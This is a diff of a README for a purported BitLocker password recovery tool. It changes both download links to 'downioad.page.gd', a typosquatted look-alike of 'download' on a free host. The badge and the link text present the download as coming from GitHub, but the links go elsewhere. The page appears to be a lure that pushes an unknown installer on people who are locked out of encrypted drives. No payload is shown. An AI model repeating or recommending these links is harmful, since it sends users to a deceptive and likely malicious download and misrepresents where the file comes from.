@@ -2,7 +2,7 @@
 
 BitLocker Password Recovery is a specialized software designed for Windows users to recover passwords from BitLocker encrypted volumes. This tool provides a straightforward approach to access your data when you have forgotten your BitLocker password or recovery key. With support for Windows 10 and 11, it ensures compatibility with modern systems, making it a reliable solution for personal and professional use.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -57,7 +57,7 @@ BitLocker Password Recovery Tool offers a free trial with limited functionality 
 
 For the latest version of BitLocker Password Recovery Tool, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
